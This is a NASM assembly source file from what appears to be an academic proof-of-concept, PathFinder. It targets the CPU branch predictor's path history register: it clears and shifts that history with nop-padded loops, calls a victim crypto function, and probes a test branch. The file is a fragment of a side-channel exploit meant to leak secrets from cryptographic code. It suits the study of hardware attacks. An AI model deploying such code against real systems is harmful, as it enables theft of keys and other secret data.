; # *****************************************
; # CONFIDENTIAL SOURCE CODE, DO NOT DISTRIBUTE!
; # IN SUBMISSION, ASPLOS 2024.
; # *****************************************
; #     Project:        PathFinder, PHR Attack Proof-of-Concept (PoC)
; #     Author:         Hosein Yavarzadeh
; #     Email:          hyavarzadeh@ucsd.edu
; #     Affiliation:    University of California, San Diego (UCSD)
; # *****************************************
;  ----------------------------------------------------------------------
;  Copyright (c) 2023 Hosein Yavarzadeh

;  Permission is hereby granted, free of charge, to any person obtaining
;  a copy of this software and associated documentation files (the
;  "Software"), to deal in the Software without restriction, including
;  without limitation the rights to use, copy, modify, merge, publish,
;  distribute, sublicense, and/or sell copies of the Software, and to
;  permit persons to whom the Software is furnished to do so, subject to
;  the following conditions:
;  The above copyright notice and this permission notice shall be
;  included in all copies or substantial portions of the Software.
;  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
;  EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
;  MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
;  NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
;  LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
;  OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
;  WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
;  ----------------------------------------------------------------------

%define repeat0  10     ; Number of repetitions of whole test
%define repeat1  100    ; Repeat count for loop around testcode
%define repeat2  1      ; Repeat count for repeat macro around testcode

%include "./phr_model.nasm"
%include "./victim_phr_model.nasm"

%macro testinitc 0
    ; UserData [0:99] -> Any target addresses 
    ; UserData [100:199] -> Varibles (e.g., UserData[100]: SHIFT PHR variable)
    ; UserData [200:299] -> Random bits
    ; UserData [400:599] -> PHR Model bits
    ; UserData [600:799] -> Victim PHR Model bits

    lea rdi, [UserData+200]
    mov ebx, 100
    rand_array_loop:
    rdrand eax
    and eax, 1
    mov [rdi], al
    inc rdi
    dec ebx
    jnz rand_array_loop

%endmacro

%macro testinit2 0
    lea rdi, [UserData+200]
%endmacro

%macro testcode 0

    inc rdi
    cmp byte[rdi],1
    je PHR_Model_Macro
    CLEAR_PHR
    ; -------------------
    ; Call the victim function here! 
    push rdi
    call crypto_function
    pop rdi
    ; -------------------
    SHIFT_PHR

    ; *******************************************************************
    ; ----- Test Branch -----
    align 1<<6
    test_branch:
    cmp byte[rdi], 1
    je test_target
    test_target:
    ; *******************************************************************

    ; *******************************************************************
    jmp end_program
    ; - - - - - - - - - - - - - - - 
    ; PHR Maker
    PHR_Model_Macro:
        PHR_Model
    ; - - - - - - - - - - - - - - - 
    end_program:
    ; *******************************************************************

%endmacro

%macro CLEAR_PHR 0
    ; ---------------- Start of CLEAR PHR
    mov r10, 193
    jmp clear_phr_loop
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    clear_phr_loop:
    %rep 60
     nop
    %endrep
    dec r10
    jnz clear_phr_loop
    ; ---------------- END of CLEAR PHR
%endmacro

%macro SHIFT_PHR 0
    ; ---------------- Start of SHIFT PHR
    movzx r10, byte[UserData+100]
    add r10, 1
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr_loop:
    %rep 60
     nop
    %endrep
    dec r10
    jnz shift_phr_loop
    ; ---------------- END of SHIFT PHR
%endmacro

